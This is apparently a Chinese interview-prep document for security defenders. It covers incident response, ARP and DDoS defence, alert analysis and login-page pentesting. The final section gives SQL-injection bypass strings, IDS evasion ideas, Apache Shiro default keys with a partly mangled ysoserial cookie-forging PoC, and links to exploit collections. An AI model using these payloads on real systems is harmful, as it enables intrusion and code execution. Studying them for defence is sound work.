先下线，然后检查挖矿是否有在内网传播及时下线所有被传播的主机、上机排查攻击痕迹、一般可以从cpu占用情况，可以进程、开放端口、计划任务、服务项几个方面排查

将样本上传到在线分析平台，清除挖矿主程序主要就是双向封禁矿池地址、删除计划任务自启动、删服务，结束恶意进程、删病毒

删不掉：确认一下一下是因为程序在使用，还是权限不够，更具具体情况采取措施

直接降权，降权到没有执行权限

### 2、假设客户中了GhostPetya勒索病毒向你咨询解决方案，请描述需要告诉他应该做些什么，如何去应急处置和善后补救

未部署端点安全的终端应急解决方案

1.做好重要文件的备份工作（非本地备份）。

2.开启系统防火墙。

3.利用系统防火墙高级设置阻止向445端口进行连接（该操作会影响使用445端口的服务）。

4.打开系统自动更新，并检测更新进行安装。

5.停止使用Windows XP、Windows 2003等微软已不再提供安全更新的操作系统。

6.如无需使用共享服务建议关闭该服务。

已部署端点安全的终端应急解决方案

1.如果用户已经部署终端管理类产品，可通过终端管理软件进行内网打补丁。

2.通过主机防火墙关闭入栈流量。主机防火墙关闭到445出栈流量。

3.开启文件审计，只允许word.exe，explorer.exe等对文件访问。

已经感染应急解决方案

1.断开网络连接，阻止进一步扩散。优先检查未感染主机的漏洞状况，做好漏洞加固工作后方可恢复网络连接。

2.已经感染终端，根据终端数据类型决定处置方式，如果重新安装系统则建议完全格式化硬盘、使用新操作系统、完善操作系统补丁、通过检查确认无相关漏洞后再恢复网络连接。

预防措施

打补丁：及时给系统打补丁，修复漏洞。

装杀软：安装杀毒软件，及时更新病毒库。开启防火墙，并升级到最新版本，阻止勒索病毒与其C&C服务器通信。

做备份：定期对重要文件以及数据库做非本地备份。电脑开启系统备份，并添加保护（这样可通过卷影备份将系统恢复到被加密之前的状态）。

备份恢复：如果事先已对关键文件做了备份，在确保已清除病毒情况下可做数据备份恢复。如果卷影备份未被勒索病毒删除，可通过卷影备份将系统恢复到未感染勒索病毒的时间点。

改密码：使用长度大于10位的复杂密码。

加限制：禁用GUEST来宾用户。尽量不要使用局域网共享，或把共享磁盘设置为只读属性，不允许局域网用户改写文件。尽量关闭不必要的端口，如：445、135、139、 3389、5900 。

防钓鱼：不要点击来源不明的邮件以及附件，钓鱼邮件是勒索病毒的重要传播源。

# ARP

#### SYN 攻击后有什么特证

看网卡状态：每秒大于 1000 以上的接收包。

看连接状态：netstat –na，看到大量 SYN_RECEIVED 状态的连接。

用冰盾 DDoS 监控器查看：SYN>100

被攻击的直接感受：

Ping 主机不通或丢包严重。

即便没有开放端口，CPU 占用很高甚至 100%

用抓包工具抓包发现有大量的 syn，

#### TCP SYN端口扫描

扫描程序向目标主机发送SYN数据段，好像准备打开一个实际的连接并等待反映一样。如果收到的应答是SYN/ACK，那么说明目标端口处于监听状态。如果收到的应答是RST，说明目标端口是关闭的。

扫描程序在收到应答之后不管是何种应答，都向目标主机发送一个RST/ACK分组、这样，虽然没有建立一个完整的TCP连接，但扫描程序也能从目标主机的应答中知道目标主机的某个端口是否开放。

#### ARP攻击分类

单向 ARP 欺骗与双向 ARP 欺骗

#### ARP防御方法

ARP 防御方法

方法一:静态 ARP 绑定

手工绑定/双向绑定 windows 客户机上： arp -s 10.1.1.254 00-01-2c-a0-e1-09

arp -a 查看 ARP 缓存表

路由器上静态绑定： Router(config)#arp 10.0.0.95 0013.240a.b219 arpa f0/0

优点：配置简单 缺点：工作量大，维护量大

方法二:ARP 防火墙

自动绑定静态 ARP 主动防御

优点：简单易用 缺点：当开启人数较多时，会增大网络负担

方法三:硬件级 ARP 防御 交换机支持"端口”做动态 ARP 绑定（配合 DHCP 服务器） 或做静态 ARP 绑定 例如: conf t ip dhcp snooping int range f0/1-48 switch(config-range-if)#

#### ARP工作流程

假设主机A和B在同一个网段，主机A要向主机B发送信息，具体的地址解析过程如下：

(1) 主机A首先查看自己的ARP表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。

(2) 如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。

(3) 主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。

(4) 主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。

#### ARP的使用场景

1、如果目的IP和本机IP属于同一网段，则ARP请求查询的就是目的IP的MAC地址

2、如果目的IP和本机IP不属于同一网段，当本机存在到达目的IP的路由时，则ARP请求查询的就是该路由下一跳的MAC地址；如果没有明细路由，就请求查询缺省路由下一跳（也就是网关）的MAC地址。

#### ARP欺骗

##### 伪造[网关](https://so.csdn.net/so/search?q=网关&spm=1001.2101.3001.7020)

攻击者B伪造ARP报文（senderIP地址是网关的，senderMAC地址不是网关的），发送给[网段](https://so.csdn.net/so/search?q=网段&spm=1001.2101.3001.7020)内的主机A，那么主机A就会把网关的ip地址和伪造的mac地址缓存到arp缓存表内，导致主机A无法把要发给网关的消息送达网关，致使主机A无法正常访问外网

##### 欺骗网关

攻击者B伪造ARP报文（senderIP地址是主机A的，senderMAC地址不是主机A的），发送给网关，网关就把主机A的ip地址和伪造的mac地址缓存到网关arp缓存表内，导致网关无法给主机A发送消息，致使主机A无法正常访问外网

##### 欺骗其他主机

攻击者B伪造ARP报文（senderIP地址是主机C的，senderMAC地址不是主机C的），发送给主机A，主机A就把主机C的ip地址和伪造的mac地址缓存到主机A的arp缓存表内，导致主机A无法给主机C发送消息

##### 泛洪攻击

攻击者伪造大量不同ARP报文在同网段内进行广播，导致网关ARP表项被占满，合法用户的ARP表项无法正常学习，导致合法用户无法正常访问外网（也可以泛洪攻击其他主机）

TCP SYN[泛洪](https://baike.baidu.com/item/泛洪)发生在OSI第四层 利用三次握手机制，攻击端在第一次握手后就没反应了，导致服务器不断发送ACK确认报文，同时占用了分配的窗口内存资源。

攻击方对服务器进行大量连接请求，最终耗尽服务器内存导致服务器无法正常工作。

#### 防范手段

##### 网关防御

· 合法ARP绑定，防御网关被欺骗

· ARP数量限制，防御ARP泛洪攻击

##### 接入设备防御

· 网关IP/MAC绑定，过滤掉仿冒网关的报文

· 合法用户IP/MAC绑定，过滤掉终端仿冒报文

· ARP限速，防御ARP泛红攻击

# DDOS

### DDOS 攻击分类

D 网络 基于巨量的 Flood 耗尽目标网络带宽资源 如：ICMP Flood, UDP Flood

D 协议 攻击协议漏洞发起的拒绝服务攻击 如：Syn Flood、Ping of Death、ARP、DNS、802.11、SSL

D 应用 针对应用软件和操作系统漏洞发起的拒绝服务攻击

大量频繁访问消耗系统资源严重的应用（CC)

通常表现为操作系统运行正常，网络流量不大，但服务停止响应

可以是一击毙命的，也可以是耗尽目标资源的

### 你是如何分析 DDOS 攻击的

Ping 211.189.31.188 HTTP

抓包分析：Smsniff.exe HTTPDebug

协议分析

Netstat 命令

Telnet 命令

冰盾 DDoS 攻击监控器

查看网卡接包与发送情况

任务管理器查看进程 CPU 占用和网络带宽占用

### DDOS是什么？有哪些？CC攻击是什么？区别是什么？

DDOS：

分布式拒绝服务攻击，利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应

主要方式：

SYN Flood

UDP Flood

ICMP Flood

Connection Flood

HTTP Get

UDP DNS Query Flood

CC攻击：

模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面，造成服务器资源的浪费，CPU长时间处于100%，网络拥塞

两者区别：

CC攻击网页，DDOS攻击服务器，更难防御

CC门槛较低，DDOS需要大量服务器

CC持续时间长，DDOS产生的影响大

### DDOS如何防范

1.对现有企业漏洞进行发现，把漏洞进行修复。然后多做基线检查，基线检查可以防御 按照国家的等保标准，做一些安全加固。比如密码，可以进行无限暴力破解。但是经过安全加固后，输入密码五次错误，可以锁定账号，这样就可以防止攻击者进行暴力破解。其他数据库，web等业务只要有这个功能都可以这样设定。这样也可以解决部分DDOS攻击，当你暴力破解一秒钟成千上万的时候，这也是一种DDOS攻击

2、保证冗余

交换机、路由器、防火墙、服务器等等多个层面都要做双机备份，死掉一台还有一台进行Crp切换。

配置多条线路，不管运营商还是DDOS攻击，打掉一条线路切换另一条线路

3、服务最小化，关掉不必要的服务和端口

4、选择安全产品

每个厂商都有抗DDOS的防火墙。比如绿盟的黑洞在国内算是排名很靠前

5、多层监控

采购一些态势感知产品，去监控。监控发现攻击第一时间进行IP封禁

\1. 完善的防御组织架构

比如监控部门、运维部门、网络部门、安全部门等所有人都得有2-3备份

\1. 每个部分明确执行应急流程

### DDOS CC应急思路以及如何防范

目前对于低网络层的 DDoS 攻击有一些有效的防护手段，如丢弃第一次 SYN 包，上流量防护设备，上 WAF 封禁地址等比较难缠的是第七层，第八层的 CC 攻击，它会找到目标网站上比较消耗资源的关键位置，重复发起攻击以消耗 CPU/内存/数据库/IO 等资源

· 目前的应付手段有：

· 优化资源消耗高位置的代码

· 增加硬件设备

· 上云

· 购买专业安全公司的安全服务

· 除此之外，隐藏服务器的真实 IP、上云 WAF、CDN、 负载均衡等设备，或者暂时将域名解析到公安网警网站等也是可以作为选择方案

· 网络设备设施

· 拼带宽，加大带宽，但是成本太高

· 使用硬件防火墙

· 选用高性能设备

· 抗 D 思想和方案

· 负载均衡

· 花钱买流量清洗服务

· CDN：web 层，比如 cc 攻击

· 分布式集群防御

· 高防：防大部分攻击，udp、大型的 cc 攻击

· 预防为主

· 系统漏洞

· 系统资源优化

· 过滤不必要的服务和端口

· 限制特定流量：检查访问来源做适当限制

### land攻击是什么？

局域网拒绝服务攻击，DDOS攻击的一种，通过发送精心构造的、具有相同源地址和目标地址的欺骗数据包，致使缺乏相应防护机制的目标设备瘫痪

# 加密

### web常用的加密算法有什么

单向散列加密 MD5、SHA、MAC

对称加密 AES、DES

非对称加密 RSA、RSA2

# 公司资产梳理

### 如何清查互联网暴露面

对于客户不清楚自己是否还有其他互联网暴露面的时候，需要先将客户已知的资产清单收集起来，方便后续对比

对于公网暴露面：

在出口网关设置流量监控工具（wireshark或者自带防火墙），检测足够长的时间以获得可能存在的暴露IP地址 nmap公网扫描全端口走一波，然后对照已知资产清单即可

nmap全端口扫描命令：nmap -sV -n -Pn -p- -iL ip.txt -oA OUTPUT --no-stylesheet --min-rate 5000 --max-retries 3

未认领的资产进行下线关停处理

### 请描述我们公司的网络安全现状，与改进方案

xx公司的网络安全状况主要存在以下几点安全隐患：

\1. IP段划分不清 IP段划分不清导致的后果就是资产管理混乱，不明IP过多，可能存在"三无七边”系统，导致安全隐患

\2. 公司疑似存留被人入侵过的 痕迹，需要及时排查

\3. 公司存在开源社区源代码泄露情况

改进方案：

\1. 资产清查启用资产清查方案，对存活IP进行认领，收集各个系统安全负责人，统一对各个IP网段进行划分部署

\2. 进行安全检查 + 渗透资产收集完成以后，对公司进行常规安全检查，包括：全端口、主机、web和服务器进行基线检查 对扫描完的结果根据资产收集情况下发给各个负责人进行整改 其外，安全中心团队安排渗透人员对公司网站进行渗透测试，发现系统脆弱性

\3. 源代码泄露情况自查 使用安全中心团队搭建的GitHub代码泄露监控系统进行检查

# 安全防护

### 对于云安全的理解

融合了并行处理、网格计算、未知病毒行为判断等新兴技术和概念，通过网状的大量客户端对网络中软件行为的异常监测，获取互联网中木马、恶意程序的最新信息，传送到Server端进行自动分析和处理，再把病毒和木马的解决方案分发到每一个客户端

### 如何防护一个端口的安全？

利用WAF、IDS、IPS等设备

危险服务端口禁止对外访问或限制IP访问

服务定期更新版本

### 企业内部安全

实名制联网

重要网段隔离

禁止接入任何USB设备

禁用WIFI网络

IP与MAC地址绑定

部署网络监控、IDS、IPS设备

定期培训，提高员工安全意识

# 护网面试题总结

### 1、设备误报如何处理？

来自外网的误报说明安全设备需要进行策略升级，不需要处置。

如果是来自内网的误报可以和负责人协商一下看能不能解决，有必要的话添加白名单处理。

### 2、IDS/IPS防护原理及绕过思路

原理：

IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击

IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版（也有IDS检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层

绕过：

TCP分片：拆分出两个TCP包

IP分片：原理同TCP分片，但是丢包严重

程序bug/性能问题：发送大量无效包，消耗IPS性能

伪造TCP状态：绕过基于状态追踪的IPS

IPV6绕过：使用IPV6地址绕过

### 3、断网排查思路

① 先ping一下服务器，服务器不通说明网络有问题，检查交换机的配置，或者查看网线是不是有问题。

② 服务器能通说明网络没有问题，检查一下准入，是不是没有认证成功。

③ 如果准入正常，就意味着有些网站可以访问，有些网站不可以访问，用户通常不会留意这个，业务网站访问不了就会直接反馈没网了。这个时候可以检查防火墙的策略，看是不是没有放行。

补充：

办公终端安装奇安信天擎，准入系统控制终端的入网认证。

### 4、安全设备

奇安信安全设备：

天眼 奇安信天眼威胁检测与分析系统

外表：奇安信网神天眼：蓝色、监测中心、威胁感知、分析中心、响应处置、资产感知、报表感知

更多、全局导航 、仪表盘、重保演戏、监测工作台、态势感知

（天眼：攻击结果：失陷、攻击成功、企图中高危、失败、威胁感知-告警列表）

（请求头、响应头、请求体、响应体）

（威胁感知：告警列表、威胁视角、攻击者视角、资产视角）

椒图 奇安信网神云锁服务器安全管理系统

天擎 终端安全管理系统 （杀毒软件）

绿盟安全设备：

NIDS 网络入侵检测系统

NIPS 网络入侵防护系统

态势感知、绿盟抗拒绝服务系统 ADS

启明星辰安全设备：

IDS天阗、天清入侵防御系统（IPS）

安恒安全设备：

明御APT攻击设备

默安安全设备：

幻阵

### 5、常见安全工具、设备

· 工具

端口及漏洞扫描：Namp、Masscan抓包：Wireshark，Burpsuite、Fiddler、HttpCanaryWeb自动化安全扫描：Nessus、Awvs、Appscan、Xray信息收集：Oneforall、hole漏洞利用：MSF、CSWebshell 管理：菜刀、蚁剑、冰蝎、哥斯拉

· 设备

网络安全设备常识常见的 HW 设备有：公安部网防G01、K01、360网康/网神防火墙、微步威胁情报、安恒云-Web应用防火墙（玄武盾）、默安蜜罐、知道创宇蜜罐、山石防火墙![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps77.jpg)即客户拥有物理的基础设施（自建机房、自购设备、网络）

· NGAF/NGFW：下一代 Web 应用防火墙（Next Generation Application Firewall，通防火墙和下一代防火墙的区别），聚合了以下功能

· IDS

HIDS：基于主机的入侵检测系统NIDS：基于网络的入侵检测系统HIDS+NIDS：基于混合数据源的入侵检测系统

· IPS：入侵防御系统

· AV：反病毒系统

· EDR：主机安全管理\终端检测和响应

EDR 实时监测终端上发生的各类行为，采集终端运行状态，在后端通过大数据安全分析、机器学习、沙箱分析、行为分析、机器学习等技术，提供深度持续监控、威胁检测、高级威胁分析、调查取证、事件响应处置、追踪溯源等功能，可第一时间检测并发现恶意活动，包括已知和未知威胁，并快速智能地做出响应，全面赋予终端主动、积极的安全防御能力简单来说就是给内网环境中所有主机安装管理软件终端，可以在管理平台集中管理和数据分析过滤，基本所有安全厂商都有自己的 EDR 产品

· 运维审计和管理平台（堡垒机

· DAS：数据库安全审计平台

· LAS：日志审计安全平台

· AC：上网行为管理系统

· 伪装欺骗系统（蜜罐、蜜网）

· SIP：安全态势感知平台

这个算是让整套系统性能得到提升的灵魂了，定位为客户的安全大脑，是一个集检测、可视、响应处置于一体的大数据安全分析平台。产品以大数据分析为核心，支持主流的安全设备、网络设备、操作系统等多源数据接入，利用大数据、关联分析、告警降噪等技术，实现海量数据的统一挖掘分析云网络

· 云网络包括私有云和公有云

· 云主机安全

· 云防火墙

· 云堡垒机

· 云蜜罐

· 云 DDOS 防护

· 等等

11.绿盟设备

· 堡垒机 SAS-H Series，堡垒机采用"物理旁路，逻辑串联”的部署思路

· 绿盟威胁情报云 NTI https://nti.nsfocus.com/

· 抗拒绝服务攻击系统 ADS

· 安全和漏洞管理 AIRO

· 网络入侵防护系统 IDPS

· web 应用防火墙

### 6、简历有护网经历，你能谈谈护网的情况吗

· 参加过护网蓝队，负责事件研判工作，主要使用 ips，ids 等设备做流量监控与日志分析工作判断安全事件是否为误判

· 监控、研判、处置、溯源

· 一般就是安全管理中心发出的态势排查单进行排查，然后将排查结果反馈给安全管理中心，再对安全管理中心发出的封堵工单和解封工单进行对应的封堵与解封，每两小时反馈一次排查结果、设备巡检报告、封堵情况。查看呼池 DDOS 设备，记录并排查告警信息

· 蓝队研判

· 研判工作要充分利用已有安全设备（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）根据研判标准进行筛选（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击

· 对于告警结合威胁情报库如：微步、奇安信威胁情报中心、绿盟威胁情报云等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为客户内网部署的设备，如果不是，继续进行下一步，在事件上报平台查看是否有其他人提交过，如果没有，则上报

· 然后根据流量日志，对请求数据包和返回数据包分析判断其是否为误报，需要留意 X-Forwarded-For（简称XFF）和 x-real-ip 可以了解些 webshell 工具的流量特征，尤其是免杀 webshell，有可能不会被设备识别

· 最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，方便后续人员研判溯源

### 7、护网工作内容

监控组

防守方主要分为三个组：安全监控组、事件研判组、应急处置组。

1）监控组分析安全设备的告警，确定是攻击就提交给处置组封禁IP；分析不出来就提交给研判组分析。

2）研判组负责分析监控组提交的告警是否为攻击，必要时可以访问受害网站复现攻击，或者联系受害网站的负责人验证是不是正常业务/人为操作。

3）处置组主要负责封禁IP，如果是webshell这种攻击，还需要联系受害网站的负责人，协助修复漏洞或者加固网站。

三个组通过指挥调度管理系统进行协作防护：

大家上班第一件事就是登录管理系统，监控组向管理系统提交告警的攻击/受害IP、告警类型以及payload，处置组/研判组看到管理系统上有新的告警了就封禁IP/分析告警事件。

### 8、护网安全事件

1、青藤云的蜜罐检查到，有个用户电脑访问了蜜罐的80端口，用户断网以后用360和火绒查杀了三个毒以后，重新上线，结果又踩了蜜罐，用户又用360和火绒扫了一遍，啥也没扫出来，就喊我过去处理。

当时我就一脸懵逼：这是我一个安全监控该干的事吗？

先是用椒图扫了一遍webshell和后门文件。

确认没有后门以后，用专杀工具全盘扫描，扫出来7个病毒。

扔到ti威胁情报中心鉴定，确定就是高危病毒。

然后提交到二线做病毒分析，确认是远控木马类病毒，与触发蜜罐的告警有相关性。

最后删掉病毒，重新上线，没有再出现异常现象。

2、后门网站修复

椒图检测到一个服务器上存在webshell，通知用户紧急下线网站，开始排查和加固。

老规矩，先用椒图扫一下webshell和后门，在Temp目录下扫出来一个webshell。

跟用户的开发核实后，确认不是业务文件，是被人上传了文件。

于是删掉webshell，取消了Temp目录的所有用户权限，在椒图上吧这台服务器的防护全部开启（默认只检测不拦截）。

开发也临时关闭了上传的功能，然后准备重新上线。

上线后网站访问不了。。。。

在重新部署了n遍项目，外加换了两台备用服务器还是不行

再换到第三台备用服务器的时候，网站恢复

### 9、告警流量分析

平均一天有2千条告警，但大部分都是误报

信息泄露

看访问路径中是否存在特殊文件和路径

比如：访问备份文件.zip

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps78.jpg)

访问默认文件

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps79.jpg)

或者特殊类型的文件

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps80.jpg)

客户授权的话，可以访问该路径，查看返回结果中是否包含敏感信息，以判断是否攻击成功

SQL注入

看请求参数、请求头或请求体中是否包含SQL语句或关键词

比如，GET请求中包含SQL语句（联合查询）union select

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps81.jpg)

请求头中包含SQL语句：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps82.jpg)

POST请求体中包含SQL语句

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps83.jpg)

为了方便绕过，还会改变SQL关键字的大小写或编码

比如：大小写绕过：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps84.jpg)

编码绕过：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps85.jpg)

客户授权的话，可以复现payload，根据页面的返回结果、响应事件判断是否注入成功

文件上传

看请求体中是否包含代码内容：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps86.jpg)

如果响应体中有success等上传成功的字样，或者有该文件的访问记录，则说明webshell上传成功

XSS

看请求参数或请求体中是否包含Javascript代码：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps87.jpg)

将响应体的数据复制到文件中执行，如果弹窗，就说明攻击成功。如果没弹窗，就 Ctrl+F 搜JS代码，常见的有：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps88.jpg)

代码执行

看请求参数、请求头、请求体是否包含恶意代码

比如：请求体中包含PHP代码：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps89.jpg)

Dedecms V5.7后台任意代码执行：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps90.jpg)

Fastjson反序列化漏洞攻击：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps91.jpg)

ThinkPHP 5.0x-5.1远程代码执行：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps92.jpg)

### 10、你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？

· 用流量监测的安全设备，比如天眼，查看报文，分析报文里和 host 和网站目录路径，查看是否可疑，使用微步查询 host 是否为恶意，使用 wireshark 对数据包深度分析

· 看一下请求的网站路径，源 IP 与目的 IP 地址，host 字段的值以及发包内容等

· 工具有 wireshark，网站的话微步在线等威胁情报中心

### 11、IDS和IPS区别

IPS(Intrusion Prevention System):入侵防御系统 IPS位于防火墙和网络的设备之间

入侵检测系统(IDS)

1.IPS位于防火墙和网络设备之间，如果检测到威胁，IPS会在攻击扩散到网络其他地方之前阻断恶意通信，而IDS存在于网络之外起到报警的作用。

2.IPS具有检测已知和未知攻击并具有防止攻击能力，IDS没有。

3.IDS基于数据包嗅探技术，只能看着网络信息流过，不能反击网络攻击。IPS可执行IDS相同的分析并阻止恶意活动。

### 12、WAF区别（云WAF、软WAF、硬WAF）阿里云、华为云、启明星辰、绿盟

云WAF是用户不用在自己的网络中部署硬件设施或者是安装软件程序，主要利用DNS解析来实现对网站的安全防护。一般用户的请求都是先发送到云端节点进行检测。发现有异常的将会进行拦截，没有异常就将请求转发至源站服务器。

软WAF是安装在需要防护的服务器上，通常WAF是用来监听端口。或者是Web容器扩展的方式进行请求检测和阻断。

硬WAF是将WAF串行一般部署在Web服务器前端，用来检测，阻断异常流量。

# 只有一个登录页面面试问题

### 1、登陆页面渗透测试常见的几种思路与总结

我们在进行渗透测试的时候，常常会遇到许多网站站点，而有的网站仅仅是基于一个登陆接口进行处理的。尤其是在内网环境的渗透测试中，客户常常丢给你一个登陆网站页面，没有测试账号，让你自己进行渗透测试，一开始经验不足的话，可能会无从下手。今天就来简单说一下如何在只有一个登陆页面的情况下，来进行渗透测试。

1、在条件允许的情况下，我们可以拿在渗透测试的开始之前拿出我们的扫描器来进行扫描，目前我们最常用的就是AWVS和Nessus，除此之外，我们还可以使用一些别的自动化测试工具，例如Nikto扫描器，Appscan，W3af，以及最近长亭科技的Xray扫描器，都可以试试。尤其是Xray扫描器，据说有许多小伙伴靠它挖到了许多漏洞。

2、SQL注入

万能密码绕过

如果我们能够直接绕过登录，来直接访问系统内部资源，那自然是最好不过的了。万能密码就是其中一最好用的一种，虽然存在的可能性不大，但是偶尔也是存在的，稍微尝试一下也不会浪费太多时间。

例如admin'or 1=1 --

"or "a"="a

万能密码在网上非常多，随便搜一下就有

例如这样，就能直接访问后台

3、登录口SQL注入

有的系统在登录口就存在SQL注入，目前我遇到过比较多的是Oracle以及MySQL的登录口注入，我们可以在登录处先抓一个包，然后根据抓包信息来构造Payload。值得一提的是，有时候我们需要在Burp里修改一下发包格式（change body encoding），才能成功注入。

在这给个例子：

正常登录报

加一个引号

修改payload,以此返回数据包不同来判断存在SQL注入。

并且，这类的SQL注入并不罕见，在许多网站中都可以进行尝试，很有可能会存在此漏洞

4、明文传输/用户名可枚举/爆破弱口令

明文传输

可能是我们做渗透测试中，最常见的一种漏洞，实际上它并不能算得上是一种漏洞，仅仅只能说是一种不足之处而已，明文传输在网站上随处可见，除了银行网站，很有可能每一个密码都是经过特殊加密然后再进行传输的。

用户名可枚举

此漏洞存在主要是因为页面对所输入的账号密码进行的判断所回显的数据不一样，我们可以通过这点来进行用户名的枚举，然后通过枚举后的账户名来进行弱口令的爆破。防御手段的话仅需要将用户名与密码出错的回显变成一样即可，例如用户名或密码出错。

爆破弱口令

弱口令可以说是渗透测试中，最最常见，也是危害"最大”的一种漏洞，因为毫无技术性，毫无新意，但是却充满了"破坏性”，尤其是在内网环境中，弱口令更是无处不在。Web页面最常用的爆破工具为Burp，我们通常使用Nmap扫描也可能扫出其他端口存在，例如3389，SSH等。

此外，我们还可以根据网站域名，以及收集的一些信息来进行定制化爆破，例如我在一次内网渗透测试中，发现了管理员的名字缩写为crj，然后我就生成了一堆密码，最后成功登陆账号密码为crj112233。

还有很多字典，可以在网上多收集一些，有时候你离Getshell，仅仅只差一个弱口令。

此外，有时候我们还可能遇到存在默认密码的系统，在这给出一些网上公开的默认账户密码

5、扫描

目录扫描

在我看来，这是最好用的目录扫描工具:https://github.com/maurosoria/dirsearch ,DirSearch已经成为了我日常渗透工作中密不可分的工具之一，并且我们可以多级别扫描，在枚举子目录的目录，很多时候可以找到突破口。

JS扫描

JS文件我们在渗透测试中也是经常用到的东西，有时候我们可以在JS文件中找到我们平时看不到的东西，例如重置密码的JS，发送短信的JS，都是有可能未授权可访问的。JS扫描的话推荐使用JSFind: GitHub - Threezh1/JSFinder: JSFinder is a tool for quickly extracting URLs and subdomains from JS files on a website.

同时它也会提取页面中的URL，

nmap扫描

Nmap的强大功能能让我们第一时间获取网站的端口信息，而这些端口信息中常常可以给予我们非常大的帮助，例如开放了3389端口，或者一些敏感端口的探测，Nmap的使用方法相比不需要我再多说，每个安全工程师都必须要精通的一种工具，以下是我的一些端口小总结，希望可以给与大家一点儿帮助。

在扫描目录与JS这块，要注意多次爆破，遍历访问多级域名的目录与JS。

我就曾在一个学校网站中，使用Nmap对批量网段的探测，获得了一个登陆网站，并且在网站中遍历目录，获得了一个test页面，最后在这个页面的JS文件中，获取到了一个接口，通过这个接口重置了主登录页面的密码。

6、框架漏洞

寻找CMS，或者网页框架，以及某些厂商的服务存在漏洞

例如Apache中间件组件Shiro反序列化漏洞，这里简单说一下：

需要一个ysoserial.jar https://github.com/frohoff/ysoserial

以及默认秘钥

4AvVhmFLUs0KTA3Kprsdag==

2AvVhdsgUs0FSA3SDFAdag==

2AvVhdDFCVdfdfDFAdag==

3AvVhmFLUs0KTA3Kprsdag==

kPH+bIxk5D2deZiIxcaaaA

wGiHplamyXlVB11UXWol8g==

6ZmI6I2j5Y+R5aSn5ZOlAA==

AsfawfsdfaAasdWWW==

Z3VucwAAAAAAAAAAAAAAAA==

6ZmI6I2j5Y+R5aSn5ZOlAA==

ZUdsaGJuSmxibVI2ZHc9PQ==

1QWLxg+NYmxraMoxAXu/Iw==

POC

from Crypto.Cipher import AES

from Crypto import Random

from base64 import b64encode

from base64 import b64decode

BS = AES.block_sizepad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)def encrypt(key, text): IV = Random.new().read(AES.block_size) cipher = AES.new(key, AES.MODE_CBC, IV=IV) data = b64encode(IV + cipher.encrypt(pad(text))) return datakey= b64decode('2AvVhdsgUs0FSA3SDFAdag==')print encrypt(key, open('payload.dat','rb').read())

使用方法

1：java -jar ysoserial.jar URLDNS "你的ceye.io或者burp的collaborator client功能中">payload.dat

2：运行python脚本，生成cookie

3：将cookie复制到burp发包,此时DNSlog就会记录，我们可以再次构造进行命令执行，在这不进行深入。

致远A8-getshell： https://www.cnblogs.com/dgjnszf/p/11104594.html

Thinkphp： https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection

Struts2: https://github.com/HatBoy/Struts2-Scan

weblogic: https://github.com/rabbitmask/WeblogicScan

以及各大Java反序列化漏洞等等

### 2、登录页面可能产生哪些漏洞呢？

1、注入点及万能密码登录

2、登录时，不安全的用户提示：比如提示用户名不存在或者密码验证码错误

3、查看登录页面源代码，看是否存在敏感信息泄露

4、不安全的验证码

5、在注册账号的时候，是否存在不安全的提示

6、不安全的密码，在注册账号的时候密码没有限制复杂度

7、任意无限注册账号

8、在暴力破解的时候不会限制ip，锁定用户

9、一个账号可以在多地登录，没有安全提示

10、账户登录之后，没有具备超时功能

11、OA，邮件，默认账号等相关系统，在不是自己注册的情况下，应该在登录之后强制要求更改密码

12、逻辑漏洞，任意更改密码

13、越权漏洞，纵向、横向越权

14、数据包含有风险信息泄露，比如COOKIE

15、不安全的数字传输，密码为明文，未使用https证书

